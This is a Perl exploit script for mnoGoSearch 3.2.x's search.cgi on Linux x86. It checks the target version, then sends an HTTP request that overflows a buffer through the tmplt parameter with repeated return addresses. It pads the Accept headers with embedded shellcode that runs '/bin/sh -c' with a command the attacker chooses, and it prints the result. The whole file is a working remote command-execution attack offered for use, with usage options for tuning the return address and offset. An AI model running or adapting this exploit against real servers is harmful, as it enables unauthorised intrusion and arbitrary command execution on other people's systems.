#!/usr/bin/perl
#
# mnogosearch 3.2.x exploit for linux ix86
# by pokleyzz and s0cket370 of d'scan clanz
# 
# Greet: 
#	tynon, sk ,wanvadder, flyguy, sutan ,spoonfork, Schm|dt, kerengge_kurus and d'scan clan.
#
# Special thanks:
#	Skywizard of mybsd
#
# 
# ---------------------------------------------------------------------------- 
# "TEH TARIK-WARE LICENSE" (Revision 1):
# wrote this file. As long as you retain this notice you 
# can do whatever you want with this stuff. If we meet some day, and you think 
# this stuff is worth it, you can buy me a "teh tarik" in return. 
# ---------------------------------------------------------------------------- 
# (Base on Poul-Henning Kamp Beerware)
#

use IO::Socket;

my $host = "127.0.0.1";
my $port = 80;
my $searchpath = "/cgi-bin/search.cgi";
my $envsize = 4096;
my $suffsize = 3;
my $rawret = "bfffd666";
my $ret;
my $cmd = "ls -l";
my $conn;

if ($ARGV[0]){
	$host = $ARGV[0];	
}
else {
	print "[x] mnogosearch 3.2.x exploit for linux ix86 \n\tby pokleyzz and s0cket370 of d' scan clan\n\n";
	print "Usage: \n mencari_asal_usul.pl hostname [command ] [path] [port] [suff] [ret]\n";
	print "\t- if not success try to use 0,1 or 2 for suff (default is 3)";
	exit;
}

if ($ARGV[1]){
	$cmd = $ARGV[1];	
}
if ($ARGV[2]){
	$searchpath = $ARGV[2];	
}
if ($ARGV[3]){
	$port = int($ARGV[3]);	
}
if ($ARGV[4]){
	$suffsize = int($ARGV[4]);	
}	
if ($ARGV[5]){
	$rawret = $ARGV[5];	
}

# linux ix86 shellcode rip from phx.c by proton
my $shellcode = "\xeb\x3b\x5e\x8d\x5e\x10\x89\x1e\x8d\x7e\x18\x89\x7e\x04\x8d\x7e\x1b\x89\x7e\x08"
             ."\xb8\x40\x40\x40\x40\x47\x8a\x07\x28\xe0\x75\xf9\x31\xc0\x88\x07\x89\x46\x0c\x88"
             ."\x46\x17\x88\x46\x1a\x89\xf1\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
             ."\x80\xe8\xc0\xff\xff\xff\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
             ."\x41\x41"
             ."/bin/sh -c echo 'Content-Type: text/hello';echo '';"
             ."$cmd"
             ."@";

sub string_to_ret {
	my $rawret = $_[0];
	if (length($rawret) != 8){
		print $rawret;
		die "[*] incorrect return address ...\n ";
	} else {
		$ret = chr(hex(substr($rawret, 6, 2)));
		$ret .= chr(hex(substr($rawret, 4, 2)));
		$ret .= chr(hex(substr($rawret, 2, 2)));
    		$ret .= chr(hex(substr($rawret, 0, 2)));
    		
	}	
	
}

sub connect_to {
	print "[x] Connect to $host on port $port ...\n";
	$conn = IO::Socket::INET->new (
					Proto => "tcp",
					PeerAddr => "$host",
					PeerPort => "$port",
					) or die "[*] Can't connect to $host on port $port ...\n";
	$conn-> autoflush(1);
}

sub check_version {
	my $result;
	connect_to();
	print "[x] Check if $host use correct version ...\n";
	print $conn "GET $searchpath?tmplt=/test/testing123 HTTP/1.1\nHost: $host\n\n"; 
	
	# capture result              
	while ($line = <$conn>) { 
		$result .= $line;
		};
	
	close $conn;
	if ($result =~ /\/test\//){
		print "[x] Correct version.. possibly vulnerable ...\n";
	} else {
		print $result;
		die "[x] Old version or wrong url\n";
	}	
}

# start exploiting ...
sub exploit {

	# generate environment variable for http request
	$envvar = 'A' x (4096 - length($shellcode));
	$envvar .= $shellcode;
	
	# generate query request
	$query = 'A' x $suffsize;
	$query .= $ret x 258;
	
	# generate request
	$request = "GET $searchpath?tmplt=$query HTTP/1.1\n"
		   ."Accept: $envvar\n"
		   ."Accept-Language: $envvar\n"
		   ."Accept-Encoding: $envvar\n"
		   ."User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\n"
		   ."Host: $host\n"
		   ."Connection: Close\n\n";
	
	print "[x] Trying to execute command ... \n";
	print "[x] Return address : $rawret \n";
	print "[x] Suffix size : $suffsize \n";
	connect_to();
	print $conn "$request"; 
	
	# capture result              
	while ($line = <$conn>) { 
		$result .= $line;
		};
	close $conn;
	
	if ($result =~ /hello/){
		print $result;
	} else {
		print "[*] Failed ...\n";
	}
}



&string_to_ret($rawret);
&check_version;
&exploit;	

